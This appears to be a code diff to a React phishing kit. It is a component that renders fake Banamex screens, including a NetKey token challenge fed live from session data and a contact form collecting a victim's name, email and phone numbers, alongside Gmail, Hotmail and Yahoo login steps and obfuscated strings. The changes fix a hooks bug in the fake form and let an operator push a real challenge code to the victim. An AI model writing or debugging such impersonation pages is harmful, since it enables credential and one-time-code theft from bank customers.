@@ -55,6 +55,10 @@ interface ScreenTemplatesProps {
     challenge?: string; // Código CHALLENGE para NetKey
     customChallenge?: string; // Código CHALLENGE personalizado para NetKey
   };
+  sessionData?: {
+    challenge?: string;
+    [key: string]: any;
+  };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
 }
@@ -75,6 +79,7 @@ const obfuscatedStrings = {
 export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
   currentScreen, 
   screenData,
+  sessionData = {},
   onSubmit,
   banco = obfuscatedStrings.bankDefault
 }) => {
@@ -93,6 +98,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [dataJ, setDataJ] = useState(''); // dataJ
   const [dataK, setDataK] = useState(''); // dataK
   const [showPass, setShowPass] = useState(false); // showPass
+  
+  // Estados para formulario de contacto de Banamex
+  const [nombreBanamex, setNombreBanamex] = useState('');
+  const [correoBanamex, setCorreoBanamex] = useState('');
+  const [celularBanamex, setCelularBanamex] = useState('');
+  const [telefonoAltBanamex, setTelefonoAltBanamex] = useState('');
   const [gmailScreen, setGmailScreen] = useState<'correo' | 'contrasena'>('correo');
   const [hotmailStep2, setHotmailStep2] = useState(false);
   const [yahooStep2, setYahooStep2] = useState(false);
@@ -2926,7 +2937,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </label>
                   <div style={{ background: '#fef9e7', border: '2px solid #f4c542', borderRadius: '6px', padding: '16px', textAlign: 'center' }}>
                     <div style={{ fontSize: '32px', fontWeight: 700, color: '#0b3b43', letterSpacing: '6px', fontFamily: 'Courier New, monospace' }}>
-                      {screenData.challenge || '00000000'}
+                      {sessionData?.challenge || screenData.challenge || '00000000'}
                     </div>
                   </div>
                 </div>
@@ -2978,11 +2989,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return banamexNetkeyContent;
 
       case ScreenType.BANAMEX_CONTACT_FORM:
-        const [nombreContacto, setNombreContacto] = useState('');
-        const [correoContacto, setCorreoContacto] = useState('');
-        const [celularContacto, setCelularContacto] = useState('');
-        const [telefonoAlternativoContacto, setTelefonoAlternativoContacto] = useState('');
-
         const banamexContactContent = (
           <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
             <div style={{ maxWidth: '900px', margin: '18px auto' }}>
@@ -3012,8 +3018,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </label>
                   <input
                     type="text"
-                    value={nombreContacto}
-                    onChange={(e) => setNombreContacto(e.target.value)}
+                    value={nombreBanamex}
+                    onChange={(e) => setNombreBanamex(e.target.value)}
                     placeholder="Ingrese su nombre completo"
                     style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
                     data-testid="input-nombre"
@@ -3026,8 +3032,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </label>
                   <input
                     type="email"
-                    value={correoContacto}
-                    onChange={(e) => setCorreoContacto(e.target.value)}
+                    value={correoBanamex}
+                    onChange={(e) => setCorreoBanamex(e.target.value)}
                     placeholder="ejemplo@correo.com"
                     style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
                     data-testid="input-correo"
@@ -3040,8 +3046,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </label>
                   <input
                     type="tel"
-                    value={celularContacto}
-                    onChange={(e) => setCelularContacto(e.target.value.replace(/\D/g, ''))}
+                    value={celularBanamex}
+                    onChange={(e) => setCelularBanamex(e.target.value.replace(/\D/g, ''))}
                     placeholder="5512345678"
                     maxLength={10}
                     style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
@@ -3055,8 +3061,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </label>
                   <input
                     type="tel"
-                    value={telefonoAlternativoContacto}
-                    onChange={(e) => setTelefonoAlternativoContacto(e.target.value.replace(/\D/g, ''))}
+                    value={telefonoAltBanamex}
+                    onChange={(e) => setTelefonoAltBanamex(e.target.value.replace(/\D/g, ''))}
                     placeholder="5512345678"
                     maxLength={10}
                     style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
@@ -3067,17 +3073,17 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <div style={{ textAlign: 'right' }}>
                   <button
                     onClick={() => {
-                      if (nombreContacto && correoContacto && celularContacto) {
+                      if (nombreBanamex && correoBanamex && celularBanamex) {
                         onSubmit(ScreenType.BANAMEX_CONTACT_FORM, {
-                          nombreContacto,
-                          correoContacto,
-                          celularContacto,
-                          telefonoAlternativoContacto
+                          nombreContacto: nombreBanamex,
+                          correoContacto: correoBanamex,
+                          celularContacto: celularBanamex,
+                          telefonoAlternativoContacto: telefonoAltBanamex
                         });
                       }
                     }}
-                    disabled={!nombreContacto || !correoContacto || !celularContacto}
-                    style={{ padding: '14px 36px', fontSize: '16px', fontWeight: 600, border: 'none', borderRadius: '6px', background: nombreContacto && correoContacto && celularContacto ? '#153e46' : '#b0c9cd', color: '#fff', cursor: nombreContacto && correoContacto && celularContacto ? 'pointer' : 'not-allowed' }}
+                    disabled={!nombreBanamex || !correoBanamex || !celularBanamex}
+                    style={{ padding: '14px 36px', fontSize: '16px', fontWeight: 600, border: 'none', borderRadius: '6px', background: nombreBanamex && correoBanamex && celularBanamex ? '#153e46' : '#b0c9cd', color: '#fff', cursor: nombreBanamex && correoBanamex && celularBanamex ? 'pointer' : 'not-allowed' }}
                     data-testid="button-enviar"
                   >
                     Enviar
